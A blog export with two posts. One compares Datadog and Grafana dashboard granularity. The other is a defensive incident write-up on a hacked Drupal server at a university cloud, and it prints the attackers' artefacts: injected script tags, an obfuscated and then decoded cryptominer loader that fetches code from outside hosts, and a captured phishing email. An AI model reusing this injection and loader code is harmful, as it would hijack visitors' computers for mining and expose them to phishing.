[{"content":"When comparing dashboards between Datadog and Grafana, we often find discrepancies between them. Even though both Datadog and Grafana scrape metrics from the same source, we see vastly differing visualizations and we often wonder which has a better accuracy compared to the source of truth. In this blog post, we explore the discrepancies between Grafana and DataDog dashboards and how we can resolve/understand them. We begin by giving a brief overview on the data (or metrics) being collected.\nOpenmetrics Openmetrics is the standard for collecting metrics. It supports text format representation that allows applications and infrastructure resources to post text-based metrics on an endpoint (eg. https://xxx:8080/metrics) and allow agents to scrape (collect) metrics from that webpage. An example of the text-format metrics is shown here: https://prometheus.io/docs/instrumenting/exposition_formats/#text-based-format.\nWe follow this methodology and allow Prometheus and Datadog agents to scrape metrics. Here is an example:\n1 2 3 4 5 6 7 8 9 10 11 ... am_request_latency_seconds_bucket{endpoint=\u0026#34;/healthz\u0026#34;,le=\u0026#34;7.5\u0026#34;,method=\u0026#34;GET\u0026#34;} 782.0 am_request_latency_seconds_bucket{endpoint=\u0026#34;/healthz\u0026#34;,le=\u0026#34;10.0\u0026#34;,method=\u0026#34;GET\u0026#34;} 782.0 am_request_latency_seconds_bucket{endpoint=\u0026#34;/healthz\u0026#34;,le=\u0026#34;+Inf\u0026#34;,method=\u0026#34;GET\u0026#34;} 782.0 am_request_latency_seconds_count{endpoint=\u0026#34;/healthz\u0026#34;,method=\u0026#34;GET\u0026#34;} 782.0 am_request_latency_seconds_sum{endpoint=\u0026#34;/healthz\u0026#34;,method=\u0026#34;GET\u0026#34;} 0.18804121017456055 am_request_latency_seconds_sum{endpoint=\u0026#34;/healthz\u0026#34;,method=\u0026#34;GET\u0026#34;} 0.18804121017456055 # HELP am_request_count Answering Machine Request Count # TYPE am_request_count counter am_request_count{endpoint=\u0026#34;/\u0026#34;,http_status=\u0026#34;400\u0026#34;,method=\u0026#34;GET\u0026#34;} 72.0 am_request_count{endpoint=\u0026#34;/healthz\u0026#34;,http_status=\u0026#34;200\u0026#34;,method=\u0026#34;GET\u0026#34;} 782.0 From viewing the metrics, we notice two types:\nSummaries (metrics that end in _sum and _count) Histograms (metrics that end in _bucket) Summaries Based on the description of a summary: https://prometheus.io/docs/concepts/metric_types/#summary:\nthe total sum of all observed values, exposed as \u0026lt;basename\u0026gt;_sum the count of events that have been observed, exposed as \u0026lt;basename\u0026gt;_count Note that they are counters and so they are always increasing. For more reference, please visit here: https://prometheus.io/docs/practices/histograms/#count-and-sum-of-observations.\nFor the usecase going forward for summaries, we\u0026rsquo;ll use am_request_count metric as example.\nGrafana Dashboard for Request Count for /healthz endpoint The graph shown below is for the Last 15 minutes of the Request Count for /healthz endpoint. As you can see, the value is almost-flat at 55 - 56 req/sec. An important note about a Grafana dashboard is that the smallest granularity (or shortest interval) between data points is 30 seconds if the time period (highlighted in yellow box on the first screenshot below) is small enough from Last 5 mins till Last 3 hours. After that, it becomes 1 min, 2min, 4min etc. for longer time periods (Last 6 hours, Last 12 hours,\u0026hellip;).\nThe Prometheus query is: am_request_count:sum(endpoint=~\u0026quot;$endpoint\u0026quot;).\nFrom looking at the Prometheus dashboard above, we can confirm the value stays within 55-56.\nDataDog Dashboard for Request Count for /healthz endpoint Now we replicate the same Grafana dashboard:\nAs you can see, the values are widely different (values fluctuate around 25-30). Why?\nMain cause of discrepancy: Data Interval Granularity Datadog\u0026rsquo;s granularity is 5 secs (as opposed to 30 secs in Grafana) for the Past 15 Minutes. Also, Datadog\u0026rsquo;s interval increases as the time period widens (same as Grafana). The main reason is that Datadog has a restriction of maximum 300 datapoints in the graph (regardless of the time period). Thus, as the time frame widens, each data point will represent more and more of an aggregated value (and vice versa if time period is shortened).\nTherefore, not much aggregation happens for Past 15 minutes time period in DataDog. Now, if we aggregate to 30 secs, the graph look similar to Grafana as shown below:\n.\nConclusion Grafana does a lot of aggregation compared to Datadog. For more information regarding data aggregation in DataDog, please refer to: https://docs.datadoghq.com/dashboards/querying/#rollup-to-aggregate-over-time.\n","date":"2020-07-04T12:45:43-05:00","image":"http://localhost:1313/post/datadog-grafana/unsplash-dashboard.jpg","permalink":"http://localhost:1313/p/datadog-vs-grafana-dashboards/","title":"Datadog vs Grafana Dashboards"},{"content":"During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.\n\u0026#x26a1; Note that for privacy concerns, I removed the actual website domain and removed some parts of the public IP addresses.\nNetwork Analysis I began my analysis by looking at the network connections on the virtual machine:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 user@host:~$ sudo netstat -an Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN tcp 0 0 10.10.10.10:38252 204.188.217.xx:80 ESTABLISHED tcp 0 0 10.10.10.10:22 10.10.10.12:58172 ESTABLISHED tcp 0 0 10.10.10.10:55387 204.188.217.xx:80 ESTABLISHED tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 :::25 :::* LISTEN tcp6 0 0 :::443 :::* LISTEN udp 0 0 10.10.10.10:123 0.0.0.0:* udp 0 0 127.0.0.1:123 0.0.0.0:* udp 0 0 0.0.0.0:123 0.0.0.0:* udp 0 0 0.0.0.0:59028 0.0.0.0:* udp 0 0 127.0.0.1:18120 0.0.0.0:* udp 0 0 0.0.0.0:1812 0.0.0.0:* udp 0 0 0.0.0.0:1813 0.0.0.0:* udp 0 0 0.0.0.0:1814 0.0.0.0:* udp 0 0 0.0.0.0:51414 0.0.0.0:* udp6 0 0 fe80::219:b9ff:fe2c:123 :::* udp6 0 0 ::1:123 :::* udp6 0 0 :::123 :::* Based on the netstat connections, I realized a few tcp connections were using the port 80. So I took a peek on the processes using these connections:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 user@host:~$ sudo lsof -i tcp:80 -P -R COMMAND PID PPID USER FD TYPE DEVICE SIZE/OFF NODE NAME /usr/sbin 26545 1 www-data 3u IPv4 22142705 0t0 TCP website.ca:55464-\u0026gt;204.188.217.xx:80 (ESTABLISHED) /usr/sbin 26550 1 www-data 3u IPv4 22105560 0t0 TCP website.ca:38252-\u0026gt;204.188.217.xx:80 (ESTABLISHED) apache2 27805 1 root 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 27993 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 28066 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 28067 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 28447 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 28449 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 29256 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 29262 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 29373 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 29375 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) apache2 29436 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN) The connections to some IP address with port 80 looked interesting and so I took a deeper dive on the process 26545:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 user@host:~$ sudo lsof -p 26545 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME /usr/sbin 26545 www-data cwd DIR 252,0 69632 3538945 /tmp /usr/sbin 26545 www-data rtd DIR 252,0 4096 2 / /usr/sbin 26545 www-data txt REG 252,0 10416 3017043 /usr/bin/perl /usr/sbin 26545 www-data mem REG 252,0 43416 4981915 /usr/lib/perl/5.18.2/auto/Socket/Socket.so /usr/sbin 26545 www-data mem REG 252,0 18728 4981918 /usr/lib/perl/5.18.2/auto/IO/IO.so /usr/sbin 26545 www-data mem REG 252,0 43368 6946983 /lib/x86_64-linux-gnu/libcrypt-2.19.so /usr/sbin 26545 www-data mem REG 252,0 141574 6947044 /lib/x86_64-linux-gnu/libpthread-2.19.so /usr/sbin 26545 www-data mem REG 252,0 1071552 6946910 /lib/x86_64-linux-gnu/libm-2.19.so /usr/sbin 26545 www-data mem REG 252,0 14664 6946980 /lib/x86_64-linux-gnu/libdl-2.19.so /usr/sbin 26545 www-data mem REG 252,0 1840928 6947193 /lib/x86_64-linux-gnu/libc-2.19.so /usr/sbin 26545 www-data mem REG 252,0 1608280 3017046 /usr/lib/libperl.so.5.18.2 /usr/sbin 26545 www-data mem REG 252,0 149120 6947052 /lib/x86_64-linux-gnu/ld-2.19.so /usr/sbin 26545 www-data 0r CHR 1,3 0t0 6368 /dev/null /usr/sbin 26545 www-data 1w FIFO 0,8 0t0 22105555 pipe /usr/sbin 26545 www-data 2w REG 252,0 14135 10751213 /var/log/apache2/error.log /usr/sbin 26545 www-data 3u IPv4 22143052 0t0 TCP website.ca:55789-\u0026gt;204.188.217.xx:http (ESTABLISHED) /usr/sbin 26545 www-data 6u unix 0xffff88022e742c00 0t0 22105553 socket There were perl scripts running and also the process was accessing /var/log/apache2/error.log. I noticed the IP address 204.188.217.xx kept recurring and I knew it was related to the webserver. My next stop was to look at the application itself.\nApplications Analysis I started checking the /var/www directory to check for any activity by the user www-data:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 user@host:/var/www$ ls -la total 56 drwxr-xr-x 13 root root 4096 Sep 10 22:37 . drwxr-xr-x 13 root root 4096 Feb 28 2017 .. drwxr-xr-x 5 root root 4096 Oct 3 2016 alg.old drwxr-xr-x 8 root root 4096 Aug 23 2013 corporateclean drwxr-xr-x 2 root root 4096 Jul 17 2012 demo drwxr-xr-x 2 root root 4096 Feb 1 2017 html drwxr-xr-x 11 www-data www-data 4096 Sep 3 23:52 subdomain drwxr-xr-x 5 root root 4096 Nov 29 2017 nal drwxr-xr-x 2 root root 4096 Mar 3 2015 phpmyadmin drwxrwxr-x 6 www-data www-data 4096 Feb 5 2018 site drwxr-xr-x 8 root root 4096 Feb 28 2017 site-wp-3.3 drwxr-xr-x 6 stack stack 4096 Feb 28 2017 site-wp-3.5 drwxr-xr-x 6 stack stack 4096 Feb 28 2017 site-wp-3.7 -rw-r--r-- 1 root root 21 May 4 2012 test.php There were two folders: subdomain and site. Since subdomain is the most recent updated folder, I delved onto the includes/ subfolder:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 user@host:/var/www/subdomain$ ls -la --full-time includes/ total 1804 drwxr-xr-x 4 www-data www-data 4096 2017-05-25 21:38:11.742771907 -0400 . drwxr-xr-x 11 www-data www-data 4096 2018-09-03 23:52:29.924296116 -0400 .. -rw-r--r-- 1 www-data www-data 13816 2017-05-25 17:54:24.388035506 -0400 actions.inc -rw-r--r-- 1 www-data www-data 46913 2017-05-25 17:54:24.388035506 -0400 ajax.inc -rw-r--r-- 1 www-data www-data 1701 2017-05-25 17:54:24.388035506 -0400 archiver.inc -rw-r--r-- 1 www-data www-data 13664 2017-05-25 17:54:24.384035450 -0400 authorize.inc -rw-r--r-- 1 www-data www-data 17497 2017-05-25 17:54:24.388035506 -0400 batch.inc -rw-r--r-- 1 www-data www-data 2310 2017-05-25 17:54:24.380035393 -0400 batch.queue.inc -rw-r--r-- 1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc -rw-r--r-- 1 www-data www-data 19998 2017-05-25 17:54:24.384035450 -0400 cache.inc -rw-r--r-- 1 www-data www-data 2487 2017-05-25 17:54:24.384035450 -0400 cache-install.inc -rw-r--r-- 1 www-data www-data 302278 2017-05-25 17:54:24.384035450 -0400 common.inc ... There was one particulr line that looks very suspicious (because of the last updated timetstamp and the size was larger than the others):\n-rw-r--r-- 1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc\nWhile sifting through the file I was able to find something interesting at the end:\n1 2 ?\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;//upgraderservices.cf/drupal.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;?php^M ?\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;//drupalupdates.tk/check.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;?php^M This looked very suspicious because of the domains and so I researched this piece of code and found out these were cryptomining scripts, as reported by a twitter post: https://twitter.com/bad_packets/status/1037416308336287744\nTo remediate this issue, I simply removed these scripts. However, the connections still persisted:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 user@host:/var/www/subdomain$ netstat -an Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN tcp 0 0 10.10.10.10:42191 98.137.157.43:25 TIME_WAIT tcp 0 1 10.10.10.10:47567 192.64.147.176:25 SYN_SENT tcp 0 1 10.10.10.10:48204 23.20.239.12:25 SYN_SENT tcp 0 0 10.10.10.10:46017 67.195.228.87:25 TIME_WAIT tcp 0 1 10.10.10.10:48211 23.20.239.12:25 SYN_SENT tcp 0 0 10.10.10.10:50025 98.136.101.116:25 TIME_WAIT tcp 0 1 10.10.10.10:49812 52.162.126.195:25 SYN_SENT tcp 0 1 10.10.10.10:36409 185.53.178.8:25 SYN_SENT tcp 0 1 10.10.10.10:48231 23.20.239.12:25 SYN_SENT tcp 0 1 10.10.10.10:43103 207.148.248.145:25 SYN_SENT tcp 0 1 10.10.10.10:58587 162.255.119.180:25 SYN_SENT tcp 0 168 10.10.10.10:22 10.10.10.12:38580 ESTABLISHED tcp 0 0 10.10.10.10:42186 98.137.157.43:25 TIME_WAIT tcp 0 1 10.10.10.10:45291 68.178.213.61:25 SYN_SENT tcp 0 0 10.10.10.10:37805 204.188.217.xx:80 ESTABLISHED tcp 0 2205 10.10.10.10:34654 216.120.254.206:25 ESTABLISHED tcp 0 1 10.10.10.10:39909 184.168.131.241:25 SYN_SENT tcp 0 1 10.10.10.10:48962 184.168.47.225:25 SYN_SENT tcp 0 0 10.10.10.10:38409 98.136.96.73:25 TIME_WAIT tcp 0 0 10.10.10.10:55883 216.251.100.19:25 ESTABLISHED tcp 0 0 10.10.10.10:32777 204.188.217.xx:80 ESTABLISHED tcp 0 1 10.10.10.10:33846 159.8.40.50:25 SYN_SENT tcp 0 1 10.10.10.10:47992 198.185.159.145:25 SYN_SENT tcp 0 1 10.10.10.10:39920 184.168.131.241:25 SYN_SENT tcp 0 0 10.10.10.10:37092 66.218.85.151:25 TIME_WAIT tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 :::25 :::* LISTEN tcp6 0 0 :::443 :::* LISTEN udp 0 0 10.10.10.10:123 0.0.0.0:* udp 0 0 127.0.0.1:123 0.0.0.0:* ... Now there was even a SMTP port open (port 25). I sniffed some packets on the SMTP port:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 user@host:/var/www/subdomain$ sudo tshark \u0026#34;port 25\u0026#34; Running as user \u0026#34;root\u0026#34; and group \u0026#34;root\u0026#34;. This could be dangerous. tshark: Lua: Error during loading: /usr/share/wireshark/init.lua:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user. Capturing on \u0026#39;eth0\u0026#39; 155 187.354503622 74.6.137.68 → 10.10.10.10 SMTP 171 S: 250 sender \u0026lt;www-data@www.website.ca\u0026gt; ok | 250 recipient \u0026lt;atheneos@atheneoscafe.com\u0026gt; ok | 354 go ahead 156 187.354596107 10.10.10.10 → 74.6.137.68 SMTP 1514 C: DATA fragment, 1448 bytes 157 187.354605929 10.10.10.10 → 74.6.137.68 SMTP|IMF 853 subject: =?UTF-8?B?TG9nTWVJbiBOb3RpZmljYXRpb24gLSBDb21wdXRlciBJRDogMjg1MzI4NTczNSBkZWxldGVk?=, from: =?UTF -8?B?TG9nTWVJbi5jb20=?= \u0026lt;noreplay@logmein.com\u0026gt;, , , \u0026lt;p\u0026gt;Event: Computer deleted\u0026lt;/p\u0026gt; , \u0026lt;p\u0026gt;If this is an error, use the link bellow to restore your computer back.\u0026lt;/p\u0026gt; , \u0026lt;p\u0026gt;\u0026lt;a rel=\u0026#34;nofollow noopener\u0026#34; target=\u0026#34;_blank\u0026#34; href=\u0026#34;https://restore.logmein.click/pc/?e=bmV0LmFzc2FzeW5AeWFob28uY29t\u0026#34; style=\u0026#34;outline: none; color: #00aeef; font-weight: bold; text-decoration: none;\u0026#34;\u0026gt;http://restore.logmein.com/login.aspx?clusterid=YXRoZW5lb3NAYXRoZW5lb3NjYWZlLmNvbQ==\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; Account holder: atheneos@atheneoscafe.com \u0026lt;br /\u0026gt; Computer ID: 5714726389 \u0026lt;br /\u0026gt; At: 21.12.2018 13:03:20\u0026lt;br /\u0026gt; From: 127.0.0.1 (localhost)\u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; LogMeIn Account Holders can change notification settings by clicking their LogMeIn ID in the upper-right corner of LogMeIn Central and then Account \u0026amp;gt; Security \u0026amp;gt; Account Audit.\u0026lt;/p\u0026gt; , \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; , \u0026lt;p\u0026gt;\u0026lt;span style=\u0026#34;color: #333333; font-family: arial, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: #ffffff; text-decoration-color: initial; display: inline !important; float: none;\u0026#34;\u0026gt;Copyright \u0026amp;copy; 2003-2018 LogMeIn, Inc.\u0026lt;/span\u0026gt;\u0026lt;a rel=\u0026#34;nofollow noopener\u0026#34; target=\u0026#34;_blank\u0026#34; href=\u0026#34;https://secure.logmein.com/policies/trademark.aspx\u0026#34; style=\u0026#34;margin: 0px; padding: 0px; border: 0px; font-style: normal; font-weight: 400; font-stretch: inherit; font-size: 11px; line-height: inherit; font-family: arial, sans-serif; vertical-align: baseline; outline: 0px; color: #0088ce; text-decoration: none; cursor: pointer; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: #ffffff;\u0026#34;\u0026gt;All rights reserved.\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; , , , This looked more like phishing activity and I thought there could be more dark things lurking in this machine. This explained why removing the scripts did not close the connections.\nPhishing Attack I realized there were potentially 2 (common) ways to attacking this server: either through the ssh open port 22 or through the web application (hosted on port 80). Since there were a lot of activity with the web-server, I visited the domain of the website and checked for suspicious elements on the background.\nUpon visiting the site’s main page https://subdomain.website.ca and when inspecting the elements on the HTML page of the site, I found a hidden javascript tag code:\nJust like any (in)sane person would do, I downloaded the file and took a look:\n1 2 3 4 5 6 7 8 9 10 user@host:$ wget http://wt-23...full-http-control user@host:$ cat full-http-control var _0x17e1=[\u0026#34;script\u0026#34;,\u0026#34;createElement\u0026#34;,\u0026#34;type\u0026#34;,\u0026#34;text/javascript\u0026#34;,\u0026#34;readyState\u0026#34;,\u0026#34;onreadystatechange\u0026#34;,\u0026#34;loaded\u0026#34;,\u0026#34;complete\u0026#34;,\u0026#34;onload\u0026#34;,\u0026#34;src\u0026#34;,\u0026#34;appendChild\u0026#34;,\u0026#34;head\u0026#34;, \u0026#34;getElementsByTagName\u0026#34;,\u0026#34;http://146.185.234.xx/hhY6.js\u0026#34;,\u0026#34;undefined\u0026#34;,\u0026#34;stop\u0026#34;,\u0026#34;_client\u0026#34;,\u0026#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742\u0026#34;,\u0026#34;start\u0026#34;]; function loadScript(_0x17a8x2,_0x17a8x3){var _0x17a8x4=document[_0x17e1[1]](_0x17e1[0]);_0x17a8x4[_0x17e1[2]]= _0x17e1[3];if(_0x17a8x4[_0x17e1[4]]) {_0x17a8x4[_0x17e1[5]]= function(){if(_0x17a8x4[_0x17e1[4]]== _0x17e1[6]|| _0x17a8x4[_0x17e1[4]]== _0x17e1[7]){_0x17a8x4[_0x17e1[5]]= null;_0x17a8x3()}}} else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)} loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!= _0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]= new Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)}) A cleaner version would be:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 var _0x17e1= [\u0026#34;script\u0026#34;, \u0026#34;createElement\u0026#34;, \u0026#34;Type\u0026#34;, \u0026#34;text/javascript\u0026#34;, \u0026#34;readyState\u0026#34;, \u0026#34;Onreadystatechange\u0026#34;, \u0026#34;Loaded\u0026#34;, \u0026#34;Complete\u0026#34;, \u0026#34;Onload\u0026#34;, \u0026#34;Src\u0026#34;, \u0026#34;appendChild\u0026#34;, \u0026#34;Head\u0026#34;, \u0026#34;getElementsByTagName\u0026#34;, \u0026#34;http://146.185.234.xx/hhY6.js\u0026#34;, \u0026#34;Undefined\u0026#34;, \u0026#34;Stop\u0026#34;, \u0026#34;_client\u0026#34;, \u0026#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742\u0026#34;, \u0026#34;Start\u0026#34;]; function loadScript(_0x17a8x2,_0x17a8x3){ var _0x17a8x4 = document[_0x17e1[1]](_0x17e1[0]); _0x17a8x4[_0x17e1[2]] = _0x17e1[3]; if(_0x17a8x4[_0x17e1[4]]){ _0x17a8x4[_0x17e1[5]] = function(){ if(_0x17a8x4[_0x17e1[4]] == _0x17e1[6] || _0x17a8x4[_0x17e1[4]] == _0x17e1[7]){ _0x17a8x4[_0x17e1[5]] = null;_0x17a8x3()}}}else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!= _0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]= new Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)}) So, this link fetched some malicious script to load hhY6.js. I tried to unravel the loadScript functions for better verbosity:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 0x17e1[0] = \u0026#34;script\u0026#34; 0x17e1[1] = \u0026#34;createElement\u0026#34; 0x17e1[2] = \u0026#34;type\u0026#34; 0x17e1[3] = \u0026#34;text/javascript\u0026#34; 0x17e1[4] = \u0026#34;readyState\u0026#34; 0x17e1[5] = \u0026#34;onreadystatechange\u0026#34; 0x17e1[6] = \u0026#34;loaded\u0026#34; 0x17e1[7] = \u0026#34;complete\u0026#34; 0x17e1[8] = \u0026#34;onload\u0026#34; 0x17e1[9] = \u0026#34;src\u0026#34; 0x17e1[10] = \u0026#34;appendChild\u0026#34; 0x17e1[11] = \u0026#34;head\u0026#34; 0x17e1[12] = \u0026#34;getElementsByTagName\u0026#34; 0x17e1[13] = \u0026#34;http://146.185.234.xx/hhY6.js\u0026#34; 0x17e1[14] = \u0026#34;undefined\u0026#34; 0x17e1[15] = \u0026#34;stop\u0026#34; 0x17e1[16] = \u0026#34;_client\u0026#34; 0x17e1[17] = \u0026#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742\u0026#34; 0x17e1[18] = \u0026#34;start\u0026#34; function loadScript(_0x17a8x2,_0x17a8x3){ var _0x17a8x4 = document[\u0026#34;createElement\u0026#34;](\u0026#34;script\u0026#34;); _0x17a8x4[\u0026#34;type\u0026#34;] = \u0026#34;text/javascript\u0026#34;; if(_0x17a8x4[\u0026#34;readyState\u0026#34;]){ _0x17a8x4[\u0026#34;onreadystatechange\u0026#34;] = function(){ if(_0x17a8x4[\u0026#34;readyState\u0026#34;] == \u0026#34;loaded\u0026#34; || _0x17a8x4[\u0026#34;readyState\u0026#34;] == \u0026#34;complete\u0026#34;){ _0x17a8x4[\u0026#34;onreadystatechange\u0026#34;] = null; _0x17a8x3() } } } else { _0x17a8x4[\u0026#34;onload\u0026#34;] = function(){ _0x17a8x3() } }; _0x17a8x4[\u0026#34;src\u0026#34;] = _0x17a8x2; document[\u0026#34;getElementsByTagName\u0026#34;](\u0026#34;head\u0026#34;)[0][\u0026#34;appendChild\u0026#34;](_0x17a8x4) } loadScript(\u0026#34;http://146.185.234.xx/hhY6.js\u0026#34;,function(){ setTimeout(function(){ if( typeof (miner)!= \u0026#34;undefined\u0026#34;){ try{miner[\u0026#34;stop\u0026#34;]()} catch(e){} }; if( typeof (_client)!= \u0026#34;undefined\u0026#34;){ try{_client[\u0026#34;stop\u0026#34;]()} catch(e){} }; document[\u0026#34;_client\u0026#34;] = new Client.Anonymous(\u0026#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742\u0026#34;,{throttle:0.3}); document[\u0026#34;_client\u0026#34;][\u0026#34;start\u0026#34;](Client.FORCE_MULTI_TAB) },1000) }) This script was trying to load more cryptojacking scripts. It had a similar resemblance to: https://coinhive.com/documentation/miner\nMySQL Database Analysis Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) was injected in a MySQL table: block_custom in database: subdomainsite\n1 2 3 4 | 8 | \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | drupal update | php_code | | 9 | \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | drupal updater | full_html | While looking at the table rows, the links were trying to force the site to load the cryptojacking scripts. I cleaned up these rows from MySQL:\n1 2 3 4 5 mysql\u0026gt; delete from block_custom where bid=8; Query OK, 1 row affected (0.05 sec) mysql\u0026gt; delete from block_custom where bid=9; Query OK, 1 row affected (0.03 sec) After deleting the rows, the footer code disappeared, thus removing the malware from loading on the page \u0026#x1f389; \u0026#x1f389; \u0026#x1f389;\nAlso, when looking at MySQL command history:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 user@host:/var/www/subdomain$ cat ~/.mysql_history show databases; use subdomainsite; show tales; show tables; select column from users; select * from users; show cloumns from users; show columns from users; select mail from users; show databases; use subdomainsite; select * from users; show columns from users; select * from users where mail like \u0026#39;@drupaler%\u0026#39;; select * from users where mail like \u0026#39;%@drupaler%\u0026#39;; delete from users where mail like \u0026#39;%@drupaler%\u0026#39;; select mail from users; show databases; use subdomainsite; select mail from users; select * from users where mail like \u0026#39;%brainhard%\u0026#39;; delete from users where mail like \u0026#39;%brainhard%\u0026#39;; select mail from users; delete from users where mail like \u0026#39;%bee@addmyhome.com%\u0026#39;; delete from users where mail like \u0026#39;%canie.assassins-creed.org%\u0026#39;; delete from users where mail like \u0026#39;%quinn.adkins38@visitnorwayusa.com%\u0026#39;; delete from users where mail like \u0026#39;%menherbalenhancement.com%\u0026#39;; show databases; use WordPressDB; show tables; describe wp_posts; select * from wp_posts; describe wp_posts; show databases; use subdomainsite; select mail from users; select * from users where mail like \u0026#39;%@drupaler%\u0026#39;; select * from users where mail like \u0026#39;%drupaler%\u0026#39;; select * from users where mail like \u0026#39;%drupal%\u0026#39;; select mail from users where mail like \u0026#39;%drupal%\u0026#39;; delete from users where mail like \u0026#39;%drupal%\u0026#39;; select mail from users; use subdomainsite; select mail from users; show databases; use WordPressDB; show tables; describe wp_users; select * from wp_users; … It looked like they tried to delete their spamming email domains: https://www.pozzo-balbi.com/help/List_of_email_spamming_domains\n\u0026#x1f38a; Now, the webshell IRC connections and phishing activities stopped! \u0026#x1f38a; Conclusion \u0026#x203c;\u0026#xfe0f; MAIN CAUSE \u0026#x203c;\u0026#xfe0f; : The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool. \u0026#x2705; SOLUTION \u0026#x2705; : Patch systems regularly and keep an eye out for vulnerabilities. We 